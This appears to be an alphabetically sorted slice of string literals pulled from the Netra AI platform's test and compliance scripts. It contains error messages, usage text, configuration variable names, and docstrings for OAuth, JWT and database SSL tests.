    "Environment variables set for real service testing",
    "Environment:",
    "Environment: STAGING",
    "Error after deployment",
    "Error analyzing",
    "Error analyzing file",
    "Error checking",
    "Error checking git diff:",
    "Error checking size of",
    "Error during fake test scanning:",
    "Error fixing",
    "Error fixing file:",
    "Error fixing mock component function in",
    "Error fixing parentheses in",
    "Error fixing test config:",
    "Error fixing test discovery:",
    "Error killing process",
    "Error levels within acceptable limits",
    "Error loading Jest coverage:",
    "Error loading Python coverage:",
    "Error loading test results:",
    "Error parsing test file",
    "Error processing",
    "Error rate reduced from 2.3% to 0.8%.",
    "Error reading",
    "Error reading file",
    "Error reading file:",
    "Error reading test file",
    "Error reducing mocking in",
    "Error running validator:",
    "Error scanning",
    "Error score:",
    "Error should mention URL problem for input:",
    "Error splitting",
    "Error splitting file",
    "Error splitting function",
    "Error starting development server:",
    "Error stopping development server:",
    "Error updating",
    "Error:",
    "Error: Could not find tests/e2e directory. Make sure script is run from project root.",
    "Error: File",
    "Error: Frontend directory not found at",
    "Error: test_categorization.json not found. Run categorize_tests.py first.",
    "Errors Encountered:",
    "Errors encountered:",
    "Errors:",
    "Est. Duration:",
    "Estimated Duration:",
    "Example Message Flow Test Runner",
    "Example Message Flow system is ready for production.",
    "Example file not found!",
    "Example file:",
    "Example refactoring:",
    "Example split:",
    "Examples demonstrated:",
    "Examples:\n  # Run all Jest tests\n  python unified_test_runner.py --service frontend\n  \n  # Run specific category\n  python unified_test_runner.py --service frontend --category components\n  python unified_test_runner.py --service frontend --category hooks\n  \n  # Run with coverage\n  python unified_test_runner.py --service frontend --coverage\n  \n  # Run E2E tests with Cypress\n  python unified_test_runner.py --service frontend --e2e\n  python unified_test_runner.py --service frontend --cypress-open\n  \n  # Run specific test file\n  python unified_test_runner.py --service frontend components/Button.test.tsx\n  \n  # Watch mode for development\n  python unified_test_runner.py --service frontend --watch\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service frontend --lint --type-check --coverage --build",
    "Examples:\n  # Run all tests\n  python unified_test_runner.py --service backend\n  \n  # Run specific category\n  python unified_test_runner.py --service backend --category unit\n  python unified_test_runner.py --service backend --category agent",
    "Examples:\n  python scripts/compliance/fake_test_scanner.py --scan-all\n  python scripts/compliance/fake_test_scanner.py --directory app/tests\n  python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n  python scripts/compliance/fake_test_scanner.py --report-only --format json",
    "Examples:\n  python scripts/test_imports.py                  # Quick critical import test\n  python scripts/test_imports.py --all            # Comprehensive import test\n  python scripts/test_imports.py --verbose        # Show detailed output\n  python scripts/test_imports.py --json report.json  # Save JSON report",
    "Examples:\n  python test_refactor_helper.py analyze app/tests/test_large.py\n  python test_refactor_helper.py suggest app/tests/test_large.py --strategy category\n  python test_refactor_helper.py validate app/tests/test_large.py",
    "Examples:\n  python test_size_validator.py                    # Validate all tests\n  python test_size_validator.py --format json     # JSON output\n  python test_size_validator.py --format markdown # Markdown output\n  python test_size_validator.py --output report.md # Save to file\n  python test_size_validator.py --auto-split      # Auto-split violations",
    "Exception in",
    "Exclude tests for specific environment",
    "Execute tests with full optimization pipeline",
    "Executing category:",
    "Execution Phases:",
    "Execution failed",
    "Expected",
    "Expected 'auth-service' in X-Service-Name header, got:",
    "Expected 'auth-service' in response, got:",
    "Expected 'auth-service', got '",
    "Expected 'staging mode' in logs, got:",
    "Expected 'staging' environment, got '",
    "Expected SQLite URL, got:",
    "Expected SQLite engine, got:",
    "Expected SQLite or empty URL during tests, got:",
    "Expected SSL-related error, got:",
    "Expected STAGING, got",
    "Expected asyncpg driver in URL, got:",
    "Expected asyncpg format, got:",
    "Expected error code '",
    "Expected event type '",
    "Expected exit code:",
    "Expected high usage warning, got:",
    "Expected ssl=require parameter, got:",
    "Expected staging frontend URL, got:",
    "Expected status",
    "Expected success=",
    "Expected token to be expired, but it's valid",
    "Expected token_type 'Bearer', got '",
    "Expected user_id '",
    "FAIL",
    "FAIL: Found",
    "FAILED",
    "FAILED (",
    "FAILED FILES (",
    "FAILED TESTS:",
    "FAILED: Could not rename",
    "FAILED\\s+([\\w/\\.]+::\\w+)",
    "FAILING TEST ANALYSIS:",
    "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.",
    "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.",
    "FAKE TEST ANALYSIS:",
    "FERNET_KEY",
    "FINAL SUMMARY",
    "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.",
    "FIXED_SESSION_12345",
    "FIXES APPLIED (",
    "FIXING ALL TEST ISSUES",
    "FIXING COMMON TEST ISSUES",
    "FRONTEND_PORT",
    "FRONTEND_URL",
    "Factory compliance does not default to staging",
    "Factory status integration does not default to staging",
    "Fail Fast:",
    "Fail on any violations (for CI)",
    "Fail-fast strategy mode (default: category_failure)",
    "Failed",
    "Failed for",
    "Failed for case '",
    "Failed renames:",
    "Failed tests:",
    "Failed to analyze",
    "Failed to backup",
    "Failed to convert",
    "Failed to create",
    "Failed to create backup for",
    "Failed to create thread:",
    "Failed to fix:",
    "Failed to import auth_core modules:",
    "Failed to import optimization modules:",
    "Failed to install dependencies:",
    "Failed to kill PID",
    "Failed to load violations file:",
    "Failed to normalize",
    "Failed to parse LLM response",
    "Failed to parse file",
    "Failed to process",
    "Failed to read",
    "Failed to reject SQL injection in password:",
    "Failed to reject SQL injection:",
    "Failed to remove original file:",
    "Failed to send message:",
    "Failed to split function",
    "Failed to start Docker services",
    "Failed to start auth service:",
    "Failed to start services:",
    "Failed to update test:",
    "Failed to validate",
    "Failed to validate sync",
    "Failed:",
    "FailingAgent",
    "Failure rate:",
    "Fake Test Scan Results:",
    "Fake Test Scanner - Comprehensive fake test detection and reporting\n\n**BUSINESS VALUE JUSTIFICATION (BVJ):**\n1. **Segment**: Platform/Internal - Quality assurance for all tiers\n2. **Business Goal**: Platform Stability, Development Velocity, Risk Reduction\n3. **Value Impact**: Prevents false confidence from fake tests, improves reliability\n4. **Strategic Impact**: Reduces debugging time, accelerates issue resolution\n5. **Platform Stability**: Ensures all tests provide real validation\n\nThis script provides comprehensive fake test detection across the entire codebase.\nIt integrates with existing test infrastructure and generates actionable reports.\n\nUsage:\n    python scripts/compliance/fake_test_scanner.py --scan-all\n    python scripts/compliance/fake_test_scanner.py --directory app/tests\n    python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n    python scripts/compliance/fake_test_scanner.py --report-only",
    "Fake Tests by Severity:",
    "Fake Tests by Type:",
    "Fallback Mode (Execution Failed)",
    "Fallback to standard test execution",
    "Falling back to standard test runner...",
    "Fast-fail import testing for Netra Backend",
    "Fast-fail import testing script for Netra Backend\n\nThis script provides quick import validation to catch import errors\nearly in the development cycle. It can be run standalone or integrated\ninto CI/CD pipelines.\n\nUsage:\n    python scripts/test_imports.py              # Test critical imports (fast-fail)\n    python scripts/test_imports.py --all        # Test all imports\n    python scripts/test_imports.py --module app.services  # Test specific module",
    "Fast-fail triggered by category:",
    "Fatal error:",
    "Feature grouping is heuristic - review carefully",
    "Feature integration tests (3-5min)",
    "Fernet Key:",
    "Fernet Key: MISSING",
    "Fernet Key: OK - Configured (from",
    "Field(default=\"staging\"",
    "File",
    "File \"",
    "File \"([^\"]+\\.py)\"",
    "File does not exist:",
    "File has",
    "File not found:",
    "File size:",
    "File:",
    "Files Affected:",
    "Files exceeding",
    "Files fixed:",
    "Files modified:",
    "Files processed:",
    "Files split:",
    "Files successfully fixed:",
    "Files that failed to fix:",
    "Files with Violations:",
    "Files with import errors:",
    "Files with import order issues:",
    "Final Result:",
    "Final Summary",
    "First allocation failed:",
    "Five Whys Reproduction Tests for Auth Service Staging Errors.\nReproduces each root cause identified in the Five Whys analysis.",
    "Fix #",
    "Fix Python syntax errors",
    "Fix TestSyntaxFix classes that have __init__ constructors in test files.\n\nPytest doesn't allow test classes to have __init__ constructors.\nThis script converts them to use setup_method instead.",
    "Fix all test issues including syntax errors and size violations.",
    "Fix common test issues in the Netra codebase.",
    "Fix detected stubs (not implemented)",
    "Fix mock component function in",
    "Fix test_utils import errors in test files.\n\nThis script fixes the incorrect import:\n    from netra_backend.tests.test_utils import setup_test_path\n    \nAnd removes it since it's not needed (tests should be run from proper context).",
    "Fix the failing test:",
    "Fix the import order in test files to ensure setup_test_path() is called first.",
    "Fix:",
    "Fixed",
    "Fixed UserPlan import with placeholder enum",
    "Fixed UserSession import to use Session alias",
    "Fixed WebSocketConnectionManager import to use ConnectionManager",
    "Fixed decorator spacing in",
    "Fixed duplicate import in",
    "Fixed import order",
    "Fixed imports in:",
    "Fixed invalid syntax:",
    "Fixed syntax in:",
    "Fixed syntax issues in:",
    "Fixed unmatched parens:",
    "Fixed:",
    "Fixes Applied:",
    "Fixes made:",
    "Fixing",
    "Fixing import issues...",
    "Fixing test discovery paths...",
    "Fixing test runner configuration...",
    "Fixtures Tests - Split from test_oauth_flows.py",
    "Fixtures:",
    "For detailed guidance:",
    "Forbidden permission found:",
    "Force kill without confirmation",
    "Found",
    "Found similar names in module:",
    "Found syntax error in:",
    "Frontend API Proxy",
    "Frontend API proxy is configured",
    "Frontend API proxy test failed:",
    "Frontend Health",
    "Frontend Startup Tests",
    "Frontend Tests:",
    "Frontend application tests",
    "Frontend health check failed:",
    "Frontend is serving",
    "Frontend port",
    "Frontend proxy returned status",
    "Frontend returned status",
    "Frontend should be in registry",
    "Frontend should have started",
    "Full analysis saved to mock_analysis.json",
    "Full reports saved to test_reports/",
    "Full test suite (30-45min)",
    "Function",
    "Function '",
    "Function accepts *args, **kwargs and returns static data",
    "Function refactoring is disabled.",
    "Function/class",
    "Functions added:",
    "Functions exceeding",
    "Functions optimized:",
    "Functions:",
    "GC frequency",
    "GC pause:",
    "GCP_PROJECT_ID",
    "GCP_PROJECT_ID_NUMERICAL_STAGING",
    "GCP_REGION",
    "GEMINI_API_KEY",
    "GET",
    "GITHUB_CLIENT_ID",
    "GITHUB_CLIENT_SECRET",
    "GITHUB_TOKEN",
    "GOOGLE_CLIENT_ID",
    "GOOGLE_CLIENT_SECRET",
    "GOOGLE_CLOUD_PROJECT",
    "Generate Business Value Test Coverage Index",
    "Generate HTML test report",
    "Generate JSON test report",
    "Generate auto-split suggestions",
    "Generate comprehensive fix report",
    "Generate comprehensive test organization audit\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Development Velocity\n3. Value Impact: Identifies test organization issues blocking development\n4. Strategic Impact: Reduces development friction by 50%",
    "Generate detailed report",
    "Generate intelligent recommendations",
    "Generate intelligent test based on code analysis",
    "Generate report from existing scan results",
    "Generate splitting suggestions",
    "Generated by auto_fix_test_violations.py",
    "Generated:",
    "Generating tests for",
    "Get active sessions for user",
    "Get all sessions for a user",
    "Get isolated database session with transaction rollback",
    "Get user by ID from database",
    "Get user by email from database",
    "Git mv error:",
    "Git mv failed:",
    "GitHub User",
    "GitHub token required",
    "Google OAuth Flow Tests - Business Impact\n\nRevenue Impact: $100K+ MRR Enterprise Google SSO\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTechnical Excellence:\n- Google OAuth initiation: authorization URL generation with proper security\n- Token exchange: secure Google token validation and error handling\n- User profile mapping: comprehensive Google user information integration\n- Scope validation: minimal privilege principle and security compliance\n- State security: CSRF protection and OAuth security best practices\n- Concurrent handling: scalable Google OAuth for Enterprise user loads\n\nEnterprise Readiness:\n- Enterprise: Google SSO compliance for $100K+ Google Workspace contracts\n- Security: OAuth state validation and secure Google token handling\n- Performance: Concurrent Google OAuth request handling for Enterprise scale\n- Integration: Complete Google user profile mapping and account management\n- Compliance: Google OAuth security standards for enterprise authentication",
    "Google OAuth Flow Tests - Google SSO integration for auth service\n\nTests complete Google OAuth flow including initiation, callback handling, token exchange,\nand user information retrieval. Critical for Enterprise Google SSO requirements.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: Google SSO | Impact: $100K+ MRR\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTest Coverage:\n- Google OAuth initiation and authorization URL generation\n- Google OAuth callback handling and token exchange\n- Google user information retrieval and profile creation\n- Google OAuth error scenarios and edge cases\n- Google SSO integration validation for Enterprise requirements",
    "Google should be a supported OAuth provider",
    "Graceful degradation test failed:",
    "Graceful degradation working: degraded=",
    "HEAD",
    "HIGH",
    "HMAC signature verification failed",
    "HS256",
    "Handler initialization failed:",
    "Hardcoded test data pattern found:",
    "Has",
    "Health Endpoints",
    "Health check passed",
    "Health endpoint returned",
    "Health endpoint returned status",
    "Health endpoint test failed",
    "Health endpoint test failed:",
    "Health endpoint test passed:",
    "Health response missing field:",
    "Healthy",
    "Heap size:",
    "Hello, can you help me optimize my AI workload?",
    "Help text should display successfully",
    "Helper functions:",
    "Helper method extraction not yet implemented for",
    "High",
    "High - Agent system",
    "High - Services",
    "High - WebSocket",
    "High Failure Rate Tests:",
    "Highly Similar:",
    "INFO",
    "INSERT",
    "ITERATION",
    "ITERATIONS",
    "Identify gaps in test coverage",
    "Impact:",
    "Implement memory monitoring and alerting",
    "Implement memory optimization",
    "Implement real functionality or remove unused function",
    "Import error (expected in test environment):",
    "Import error:",
    "Import fixes applied:",
    "Import resolution failed:",
    "Import test failed. Please fix the import errors above.",
    "Import test interrupted by user",
    "Import validation failed:",
    "ImportError",
    "ImportError: cannot import name '(\\w+)' from '([\\w\\.]+)'",
    "Improve error handling",
    "Include",
    "Incomplete user information",
    "Inconsistent SSL handling: manager=",
    "Increase real LLM test coverage from",
    "Increase test coverage for critical component '",
    "Initial login failed",
    "Initialization order test failed:",
    "InitializationManager",
    "Initializing database...",
    "Insights enabling optimization decisions for",
    "Install dependencies if missing",
    "Install with: pip install cloud-sql-python-connector[asyncpg]",
    "Installing frontend dependencies...",
    "Insufficient scope for user info",
    "Integration Tests",
    "Integration test has",
    "Integration tests for component interaction",
    "Internal server error",
    "Invalid",
    "Invalid Content-Length header",
    "Invalid JWT format: expected 3 parts, got",
    "Invalid JWT structure:",
    "Invalid UUID format:",
    "Invalid access token",
    "Invalid auth provider:",
    "Invalid authorization code",
    "Invalid base64 encoding in JWT part:",
    "Invalid base64url encoding in JWT part",
    "Invalid characters in state:",
    "Invalid config response:",
    "Invalid credentials",
    "Invalid email format:",
    "Invalid health response:",
    "Invalid input detected",
    "Invalid permission format:",
    "Invalid rate limit remaining:",
    "Invalid service ID",
    "Invalid state should fail validation",
    "Invalid token",
    "Invalid token format",
    "Isolation and multi-tenancy tests",
    "It is STRONGLY recommended to:",
    "Iteration",
    "Iterations with all tests passing:",
    "Iterations with failures:",
    "Iterations:",
    "Iterative test-fix loop script that runs tests and fixes failures in a loop.",
    "JSON report saved to",
    "JWT",
    "JWT Secret:",
    "JWT Secret: MISSING",
    "JWT Secret: OK - Configured (from",
    "JWT Validation Tests - Auth Service Security Testing\n\nBusiness Value: Authentication security for cross-service communication\nTests JWT signature validation, claims requirements, and token revocation\n\nCRITICAL: Uses real JWT libraries (PyJWT) with proper security testing\nMaximum 300 lines enforced - focused on core JWT validation only",
    "JWT handling imports failed:",
    "JWT_ALGORITHM",
    "JWT_SECRET",
    "JWT_SECRET_KEY",
    "Jane Doe",
    "Job failed",
    "John Doe",
    "KEY",
    "K_REVISION",
    "K_SERVICE",
    "K_SERVICE=netra-backend:",
    "K_SERVICE=netra-prod-backend:",
    "K_SERVICE=netra-staging-backend:",
    "Key findings: Your AI workloads show 30% optimization potential.\n        Main bottlenecks: Memory allocation and network I/O.\n        Quick wins: Enable caching, batch requests, optimize prompts.\n        Estimated savings: $2,400/month with recommended changes.",
    "Key principles:",
    "Kill these processes? (y/n):",
    "Killed",
    "Killed PID",
    "Killing processes...",
    "L1",
    "L2",
    "L3",
    "L3 pattern",
    "L3 test files",
    "LARGEST FILES:",
    "LARGEST FUNCTIONS:",
    "LLM Configurations:",
    "LLM Response Generator\n\nThis module generates realistic LLM responses with production-like characteristics.",
    "LLM initialization failed",
    "LLMManager()",
    "LLMResponseGenerator",
    "LOAD_SECRETS",
    "LOGIN_FAILED",
    "LOGIN_SUCCESS",
    "LOGOUT",
    "LOG_ASYNC_CHECKOUT",
    "LOG_LEVEL",
    "Large file (",
    "Lib",
    "Line",
    "Line:",
    "Lint test files for real test requirements compliance",
    "List available categories and their configuration",
    "List processes only, don't kill",
    "List[",
    "Load test reports from test_reports/.",
    "Loaded test environment from",
    "Loading configuration...",
    "Loading coverage data...",
    "Loading test results...",
    "Local Development",
    "Local OAuth Testing Script with Enhanced Debugging\nTests the complete OAuth flow locally with detailed logging\n\nThis script:\n1. Tests OAuth configuration\n2. Simulates OAuth login flow\n3. Validates token generation\n4. Checks auth service communication",
    "Local services started successfully",
    "Localhost:3000 should be allowed in development",
    "Location",
    "Log Data Generator\n\nThis module generates realistic log data with specific patterns and behaviors.",
    "LogGenerator",
    "Logged out",
    "Login failed with status",
    "Long-duration soak testing",
    "Low - Utilities",
    "MAJOR (should fix)",
    "MALFORMED.TOKEN.HERE",
    "MANUAL ACTION REQUIRED -",
    "MAX_LOGIN_ATTEMPTS",
    "MAX_SESSIONS_PER_USER",
    "MB",
    "MEDIUM",
    "MINOR (nice to fix)",
    "MISSING",
    "MagicMock()",
    "MagicMock, MagicMock",
    "MagicMock\\(",
    "MagicMock\\(\\)",
    "Main",
    "Main entry point for optimized test execution",
    "Main entry point.",
    "Main test function.",
    "Main test runner",
    "MainTestSettings",
    "Malformed token should be invalid:",
    "Malicious sites should be blocked",
    "Many test failures are due to:",
    "Markdown report saved to",
    "Markers added:",
    "Maximum number of files to analyze",
    "Maximum number of files to process",
    "Maximum number of worker processes for Jest (frontend tests)",
    "Maximum token limit exceeded",
    "Medium - Integration",
    "Medium - Models",
    "Memory Intensive:",
    "Memory allocation failed, retrying",
    "Message flow test PASSED",
    "Message validation failed:",
    "Method '",
    "Method not found error:",
    "Methods should behave consistently across concurrent calls",
    "Metrics exported",
    "Minimal output",
    "Minimal output for CI logs",
    "Minimum coverage percentage required (default: 70)",
    "Minor warning after deployment",
    "Missing config file:",
    "Missing configs:",
    "Missing fixes:",
    "Missing method",
    "Missing permission:",
    "Missing rate limit header",
    "Missing rate limit remaining header",
    "Missing rate limit reset header",
    "Missing required field",
    "Missing required field in audit log:",
    "Missing required field in error response:",
    "Missing required field in login response:",
    "Missing required field:",
    "Missing required fields",
    "Missing required permission:",
    "Missing secret mappings:",
    "Missing setup_test_path import or call",
    "Missing test directory:",
    "Missing test file:",
    "Mobile App/1.0.0 (iOS 15.0)",
    "Mock component class '",
    "Mock component function '",
    "Mock component pattern found:",
    "Mock response",
    "Mock()",
    "Mock/test implementation comment found:",
    "MockAgent",
    "MockComponent\\s*=",
    "MockUser",
    "Mock\\(",
    "Mock\\(\\)",
    "Mock\\(spec=ToolDispatcher\\)",
    "Model inference completed",
    "Model loaded successfully",
    "Model response test failed:",
    "Modernize legacy test patterns",
    "Modernizing",
    "Modular test file created to comply with 450-line limit requirement.\nContains",
    "Module file not found:",
    "ModuleNotFoundError",
    "ModuleNotFoundError: No module named '([\\w\\.]+)'",
    "Move '",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Multi-Service Coverage:",
    "Multi-user productivity for",
    "N/A",
    "NEED TO IMPLEMENT:",
    "NETRA AI PLATFORM - BACKEND TEST RUNNER",
    "NETRA AI PLATFORM - COMPREHENSIVE TEST DISCOVERY REPORT",
    "NETRA AI PLATFORM - FRONTEND TEST RUNNER",
    "NETRA APEX UNIFIED TEST RUNNER\n==============================\nModern test runner with advanced categorization, progress tracking, and intelligent execution planning.\n\nUSAGE:\n    python unified_test_runner.py                       # Run default categories\n    python unified_test_runner.py --category unit       # Run specific category\n    python unified_test_runner.py --help                # Show all options\n\nCATEGORIES:\n    CRITICAL: smoke, startup\n    HIGH:     unit, security, database\n    MEDIUM:   integration, api, websocket, agent\n    LOW:      frontend, performance, e2e\n\nEXAMPLES:\n    python unified_test_runner.py --category unit\n    python unified_test_runner.py --categories unit api\n    python unified_test_runner.py --category performance --window-size 30\n    python unified_test_runner.py --list-categories",
    "NO",
    "Need to increase coverage by",
    "Netra Auth Service",
    "Network error",
    "New files created:",
    "New files:",
    "Next steps:",
    "No ACT compatibility checks found",
    "No API key",
    "No L3 files found!",
    "No access token received",
    "No authentication token",
    "No categories to run based on selection criteria",
    "No critical issues found. Test suite appears well-organized.",
    "No env vars set:",
    "No error details",
    "No failing tests found!",
    "No failure scan found. Run test_failure_scanner.py first.",
    "No fake tests found",
    "No import changes were needed.",
    "No large test files found for demonstration",
    "No netra_backend imports found",
    "No priority failures found.",
    "No real e2e tests found",
    "No real e2e tests found.",
    "No response from WebSocket",
    "No response received (expected due to auth)",
    "No scan performed - report only mode",
    "No setup_test_path import found",
    "No specific files identified for fixing",
    "No splitting suggestions needed!",
    "No test file size violations found!",
    "No test files changed",
    "No test files found for category '",
    "No test function violations found!",
    "No test processes found running.",
    "No test processes found.",
    "No test violations found!",
    "No tests found",
    "No token provided",
    "Non-standard",
    "None  # Use real component",
    "Normal deployment should not fail",
    "Not Set",
    "Not all states were unique",
    "Not in a git repository or git not available",
    "Not tested",
    "Note:",
    "Number of iterations",
    "Number of parallel workers (0=sequential, auto=auto, or number)",
    "Number of parallel workers (default: 4)",
    "OAUTH_CALLBACK",
    "OAUTH_CLIENT_ID",
    "OAUTH_CLIENT_SECRET",
    "OAUTH_ERROR",
    "OAUTH_REDIRECT_URI",
    "OAUTH_REDIRECT_URL",
    "OAuth Callback",
    "OAuth Configuration",
    "OAuth Configuration:",
    "OAuth Error Handling Tests - Business Impact\n\nRevenue Impact: $50K+ MRR Enterprise OAuth Reliability\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTechnical Excellence:\n- Invalid state handling: OAuth security validation and CSRF protection\n- Access denial scenarios: graceful user cancellation and error messaging\n- Token exchange failures: provider service failure recovery and error handling\n- User info failures: incomplete data handling and fallback mechanisms\n- Network resilience: timeout and connectivity error handling\n- Input validation: malformed request sanitization and security protection\n- Rate limiting: OAuth abuse prevention and service stability\n- CSRF protection: security compliance and attack prevention\n\nEnterprise Readiness:\n- Enterprise: Robust OAuth error handling for production Enterprise deployments\n- Security: CSRF protection and input validation for OAuth security compliance\n- Reliability: Network failure handling and service resilience for Enterprise SLA\n- User Experience: Graceful error handling and recovery for Enterprise users\n- Stability: Rate limiting and abuse prevention for OAuth service protection",
    "OAuth Error Handling Tests - OAuth error scenarios and edge case validation\n\nTests OAuth error handling scenarios including invalid state parameters, access denial,\ntoken exchange failures, and user information fetch failures for robust OAuth implementation.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: OAuth Reliability | Impact: $50K+ MRR\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTest Coverage:\n- OAuth invalid state parameter handling and security validation\n- OAuth access denial and user cancellation scenarios\n- OAuth token exchange failure handling and error recovery\n- OAuth user information fetch failure and fallback mechanisms\n- OAuth edge cases and malformed request handling",
    "OAuth Flow Tests for Auth Service (Synchronous)\nBasic testing of OAuth endpoints with TestClient",
    "OAuth Login Endpoint",
    "OAuth State Parameter Security Tests\nTesting Level: Unit (L1)\nFocus: OAuth state parameter security implementation\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise) \n- Business Goal: Security, Compliance, Trust\n- Value Impact: Prevents CSRF attacks and OAuth hijacking\n- Strategic Impact: Critical for platform security compliance and user trust\n\nOAuth Basics Coverage:\n- State parameter generation (cryptographically secure)\n- State parameter validation (timing-safe comparison)\n- State parameter expiration handling\n- State parameter uniqueness enforcement\n- CSRF protection through state binding",
    "OAuth config for",
    "OAuth flow tests",
    "OAuth providers not yet implemented",
    "OAuth security import failed:",
    "OAuthTokenFactory",
    "OK",
    "OK - Configured",
    "OK: setup_test_path() at line",
    "OPEN",
    "OPENAI_API_KEY",
    "OPTIMIZED TEST EXECUTION RESULTS",
    "OR",
    "OVERRIDE_TEST_ENV",
    "Only check files changed in git diff",
    "Only generate report, no fixes (SAFE, default)",
    "Only run tests matching given mark expression",
    "Only run tests matching the given keyword expression",
    "Only run tests matching the given pattern",
    "Open Cypress interactive runner",
    "Operation cancelled. Good choice!",
    "Optimization level",
    "Optimization:",
    "Optimize",
    "Optimize CPU-intensive operations",
    "Optimize database queries",
    "Optimized Backend Test Runner - 100x Productivity Gains",
    "Optimized Backend Test Runner - 100x Productivity Gains\n\nUltra-high performance test execution with intelligent parallelization,\nresource monitoring, caching, and fail-fast mechanisms for maximum efficiency.\n\nBusiness Value Justification (BVJ):\n- Segment: All customer segments (development infrastructure)\n- Business Goal: Achieve 100x faster test cycles for rapid deployment\n- Value Impact: Enables continuous deployment with sub-minute test execution\n- Revenue Impact: Accelerates time-to-market by 90%, reduces CI/CD costs by 80%\n\nUsage:\n    python scripts/test_backend_optimized.py --category unit\n    python scripts/test_backend_optimized.py --optimize-aggressive\n    python scripts/test_backend_optimized.py --benchmark",
    "Optimized execution failed:",
    "Optimizing function",
    "Optional service failed",
    "Options:",
    "Origin",
    "Output GitHub Actions annotations",
    "Output file for report",
    "Output file path",
    "Output file path (default: print to console)",
    "Output file path for the report",
    "Output format",
    "Output results as JSON",
    "Output:",
    "Overall compliance rate:",
    "Overall:",
    "PASS",
    "PASSED",
    "PASSED (",
    "PASSWORD",
    "PASSWORD_CHANGE",
    "PASSWORD_RESET",
    "PERFORMANCE SUMMARY",
    "PERMISSION_GRANTED",
    "PERMISSION_REVOKED",
    "PHASE",
    "PHASE 1: Fixing syntax errors...",
    "PHASE 2: Fixing size violations...",
    "PHASE 3: Final validation...",
    "PORT",
    "POST",
    "POSTGRES_HOST",
    "POSTGRES_PASSWORD",
    "POSTGRES_PORT",
    "POSTGRES_USER",
    "PRIORITY FAILURES (Critical/High)",
    "PR_NUMBER",
    "PYTEST_CURRENT_TEST",
    "PYTHONPATH",
    "Parallel Efficiency:",
    "Parallel Safe:",
    "Parallel:",
    "Pass Rate:",
    "Passed",
    "Passed:",
    "Password changed",
    "Password must contain at least one digit",
    "Password must contain at least one lowercase letter",
    "Password must contain at least one special character",
    "Password must contain at least one uppercase letter",
    "Password required for local auth",
    "Password too long",
    "Password too short: minimum",
    "Perform analysis without making changes",
    "Perform dry run without making changes (SAFE, default)",
    "Perform ultra-thinking deep analysis",
    "Performance Grade:",
    "Performance Simulator\n\nThis module simulates performance patterns including cascading failures and bottlenecks.",
    "Performance and SLA validation tests",
    "Performance benchmark tests",
    "PerformanceSimulator",
    "Permission Test Data Factory\nCreates test permission data for role-based access control testing.\nSupports various permission patterns and user permission assignments.",
    "PermissionFactory",
    "PermissionRequest schema does not default to staging",
    "Permissions must be a list",
    "Phase",
    "Please check test configuration.",
    "Please review failures before deploying.",
    "Please review the failed tests and fix the issues",
    "Please review violations manually and implement proper solutions.",
    "Please start PostgreSQL with:",
    "Port allocation test failed:",
    "Port allocation working: service1=",
    "Post-deployment:",
    "PostgreSQL Async Configuration Test",
    "PostgreSQL container not available:",
    "Potential circular dependencies detected",
    "Pre-deployment error",
    "Pre-deployment:",
    "Preferred splitting strategy",
    "Priority failures:",
    "Priority:",
    "Problematic files found in excluded directories:",
    "Process a specific file",
    "Process integration tests first (default: True)",
    "Processed",
    "Processed:",
    "Processing",
    "Processing Batch",
    "Processing complete!",
    "Processing first",
    "Processing specific file:",
    "Processing:",
    "Production Environment",
    "Productivity Gain:",
    "Progress display mode (default: simple)",
    "Progress:",
    "Project root directory",
    "Project root:",
    "Project-Only Real Test Requirements Validator\n\nValidates only project test files against SPEC/testing.xml real test requirements.\nExcludes virtual environments and external libraries.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns in our code\n- Strategic Impact: Ensures test reliability and system integrity",
    "Proposed new files:",
    "Protects",
    "Protocol",
    "Provider server error",
    "Provider states should be isolated",
    "Provider unavailable",
    "Python files to process",
    "QUALITY METRICS:",
    "Quick Test",
    "Quick frontend test runner that handles no-tests case properly",
    "Quick script to run tests against the actual staging environment.\n\nUsage:\n    python scripts/test_staging.py           # Run all staging tests\n    python scripts/test_staging.py --quick   # Run quick health checks only\n    python scripts/test_staging.py --full    # Run comprehensive staging tests",
    "Quick script to verify that test scanning is excluding site-packages and virtual environments",
    "Quick smoke tests for basic functionality",
    "Quick test failure scanner - identifies failing tests efficiently",
    "Quick validation test",
    "Quick validation tests (<30s)",
    "RATE_LIMITING_ENABLED",
    "READY",
    "REAL_LLM",
    "RECOMMENDATION",
    "RECOMMENDATION:",
    "RECOMMENDATIONS:",
    "REDIS_DB",
    "REDIS_DISABLED",
    "REDIS_HOST",
    "REDIS_PORT",
    "REDIS_URL",
    "REDUNDANT TEST",
    "REFRESH_TOKEN_EXPIRE_DAYS",
    "RESULTS",
    "RUNNING FRONTEND UNIT TESTS",
    "RUNNING REAL E2E TESTS:",
    "RUNNING SIMPLIFIED UNIT TESTS",
    "Rate limit exceeded",
    "Rate limiting and DDoS protection tests",
